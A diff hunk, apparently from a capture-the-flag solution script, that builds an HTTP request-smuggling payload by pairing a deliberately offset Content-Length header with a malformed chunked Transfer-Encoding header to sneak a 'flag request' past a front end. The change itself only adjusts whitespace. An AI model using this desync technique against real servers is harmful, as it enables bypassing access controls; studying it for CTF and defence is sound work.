@@ -28,7 +28,7 @@ hello_request_builder.add_content_length_header = True
 # thus we have to remove the length of the flag request from the offset
 # but we still have to add some offset back, because we have to account for the chunked encoding syntax
 # the syntax we have to account for is: <length of body, in this case flag request, in hex> + linebreak
-hello_request_builder.content_length_offset = - len(flag_request) + len(hex(len(flag_request)).replace("0x","") + "\r\n")
+hello_request_builder.content_length_offset = - len(flag_request) + len(hex(len(flag_request)).replace("0x", "") + "\r\n")
 hello_request_builder.add_chunked_encoding_header = True
 hello_request_builder.add_chunked_encoding_header_value = "asd"
 hello_request_builder.add_chunked_encoding_body = True
